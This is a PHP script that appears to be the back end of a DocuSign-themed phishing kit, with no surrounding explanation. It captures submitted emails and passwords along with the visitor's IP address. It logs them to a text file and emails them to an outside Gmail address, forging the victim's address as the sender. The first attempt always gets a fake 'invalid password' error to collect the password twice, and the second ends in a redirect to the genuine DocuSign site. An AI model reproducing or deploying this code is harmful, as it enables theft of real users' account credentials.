<?php
session_start(); // Ensure session starts before any output

// Function to get the user's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$ip_address = getUserIP();
$timestamp = date("Y-m-d H:i:s");

// Save login details in a text file
$logData = "Email: $email | Password: $password | IP: $ip_address | Time: $timestamp\n";
file_put_contents("logins.txt", $logData, FILE_APPEND);

// Prepare email
$to = "office36699@gmail.com";
$subject = "New Login Attempt";
$message = "Email: $email\nPassword: $password\nIP Address: $ip_address\nTime: $timestamp";

// Set headers to use the user's email as the sender
$headers = "From: $email\r\n";
$headers .= "Reply-To: $email\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Send email
$mail_sent = mail($to, $subject, $message, $headers);

if (!$mail_sent) {
    $_SESSION['error'] = "Failed to send email. Please try again.";
    header("Location: index.php");
    exit();
}

// Check if this is the first or second attempt
if (!isset($_SESSION['attempt'])) {
    $_SESSION['attempt'] = 1;
    $_SESSION['error'] = "Invalid email or password";
    header("Location: index.php");
    exit();
} else {
    session_destroy();
    header("Location: https://account.docusign.com");
    exit();
}
?>
